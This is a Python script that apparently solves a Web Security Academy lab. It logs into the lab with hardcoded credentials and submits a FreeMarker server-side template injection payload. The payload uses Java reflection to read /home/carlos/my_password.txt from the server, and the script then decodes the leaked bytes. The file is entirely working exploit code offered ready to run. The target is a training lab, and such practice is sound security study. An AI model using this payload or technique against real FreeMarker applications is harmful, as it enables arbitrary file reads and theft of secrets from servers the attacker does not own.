import requests
from bs4 import BeautifulSoup
import re

url = "https://ac081f151e99229ec0ef38f8003800f5.web-security-academy.net"

def  get_csrf(text):
	soup = BeautifulSoup(text, "html.parser")
	for i in soup.find_all('input'):
		if i.get('name') == "csrf":
			csrf = i.get('value')
	return csrf

def slove(url):
	s = requests.session()

	r1 = s.get(url+"/login")
	c1 = get_csrf(r1.text)

	data = {"csrf": c1, "username": "content-manager", "password" :"C0nt3ntM4n4g3r"}
	r2 = s.post(url+"/login", data=data)
	c2 = get_csrf(r2.text)

	payload = '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/home/carlos/my_password.txt").toURL().openStream().readAllBytes()?join(" ")}'
	data2 = {"csrf" : c2, "template": payload, "template-action": "save"} 
	exploit = s.post(url + "/product/template?productId=1", data=data2 )

	x = re.findall('(\d{3}(.*))', exploit.text)
	
	for i in x[1][0].split(" "):
		print(chr(int(i)), end="")
slove(url)